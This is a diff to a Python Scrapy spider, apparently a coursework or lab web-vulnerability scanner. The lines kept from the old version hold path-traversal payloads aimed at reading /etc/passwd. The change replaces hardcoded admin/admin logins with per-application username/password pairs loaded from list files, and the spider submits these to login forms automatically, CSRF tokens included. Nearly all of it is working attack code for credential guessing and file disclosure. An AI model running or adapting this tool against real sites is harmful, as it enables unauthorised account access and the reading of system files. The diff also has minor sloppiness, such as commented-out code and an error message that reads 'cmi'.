@@ -20,6 +20,8 @@ testList = [
 "?file=../../../../../../../../../../../../../../../../../../../../etc/passwd%2500",
 "?file=../../../../../../../../../../../../../../../../../../../../etc/passwd"]
 lookFor = "root:x:0:0:"
+passList = {} # string:list
+formList = {} # string:list
 
 class A3Spider(scrapy.Spider):
 	name = "a3"
@@ -30,10 +32,28 @@ class A3Spider(scrapy.Spider):
 	def parse(self, response):
 		print(response)
 		# I'm just going to assume the login forms won't appear again.
-		try:	#TODO: need a better way to check for username fields
-			usernameLogin = response.xpath('//input[@name="username" or @type="text"] ').extract_first()
-			passwordLogin = response.xpath('//input[@name="password" or @type="password"]').extract_first()
-			#TODO: password and username wordlists? currently only use admin/admin combos
+		
+		# checking hardcoded user/pass fields
+		userfield = ''
+		passfield = ''
+		username = ''
+		password =''
+		for app,v in passList.items():
+			if app in response.url:
+				username = v[0]
+				password = v[1]  
+		for app,v in formList.items():
+			if app in response.url:
+				userfield = v[0]
+				passfield = v[1] 
+
+		try:	
+			#usernameLogin = response.xpath('//input[@name="username" or @type="text"] ').extract_first()
+			#passwordLogin = response.xpath('//input[@name="password" or @type="password"]').extract_first()
+			usernameLogin = response.xpath('//input[@name="{}" or @type="text"] '.format(userfield)).extract_first()
+			passwordLogin = response.xpath('//input[@name="{}" or @type="password"]'.format(passfield)).extract_first()
+			
+
 			if (len(usernameLogin) != 0)  and (len(passwordLogin) != 0):
 				#test for csrftokens
 				usernameField = usernameLogin.split("name=")[1].replace('"', "").replace(">", "")
@@ -42,13 +62,14 @@ class A3Spider(scrapy.Spider):
 				if len(token1) !=0:
 					tokenField = token1.split("name=")[1].split('"')[1]
 					tokenValue = token1.split("value")[1].split('"')[1]
-					yield FormRequest.from_response(response,formdata={usernameField : 'admin', 
-													passwordField : 'admin' ,
-													 tokenField  : tokenValue}, callback = self.parse)
+					#yield FormRequest.from_response(response,formdata={usernameField : 'admin', 										passwordField : 'admin' ,											 tokenField  : tokenValue}, callback = self.parse)
+					yield FormRequest.from_response(response,formdata={usernameField : username,passwordField : password ,tokenField  : tokenValue}, callback = self.parse)
+
 				else:
 					print("LOGGING INNNNNN")
-					yield FormRequest.from_response(response,formdata={usernameField : 'admin',
-													 passwordField : 'admin'}, callback = self.parse)
+					#yield FormRequest.from_response(response,formdata={usernameField : 'admin',	 passwordField : 'admin'}, callback = self.parse)
+					yield FormRequest.from_response(response,formdata={usernameField : username,	 passwordField : password}, callback = self.parse)
+
 		except Exception as e:
 			pass
 
@@ -124,7 +145,42 @@ def cleanUp(cleanThis):
 			splitString[1] = eachTest
 			return splitString
 
+def readlists():
+	# read hardcoded passlist
+	fullcontent = ''
+	try:
+		with open('passlist.txt','r') as content:
+			for line in content.readlines():
+				fullcontent = fullcontent+line    
+	except Exception as e:
+			print("read passlist.txt cmi")
+
+	fullcontent = fullcontent.replace("\n","")
+	jsonobj = json.loads(fullcontent)
+	for userpass in jsonobj:
+		for k,v in userpass.items():
+			params = v.split(',')
+			passList[k]=[params[0],params[1]]
+
+	# read hardcoded formlist
+	fullcontent = ''
+	try:
+		with open('formlist.txt','r') as content:
+			for line in content.readlines():
+				fullcontent = fullcontent+line    
+	except Exception as e:
+			print("read formlist.txt cmi")
+
+	fullcontent = fullcontent.replace("\n","")
+	jsonobj = json.loads(fullcontent)
+	for userpass in jsonobj:
+		for k,v in userpass.items():
+			params = v.split(',')
+			formList[k]=[params[0],params[1]]
+		
 def main():
+	readlists() # read hardcoded user/pass lists
+
 	rhostDomains = []
 	rhostList = []
 	try:
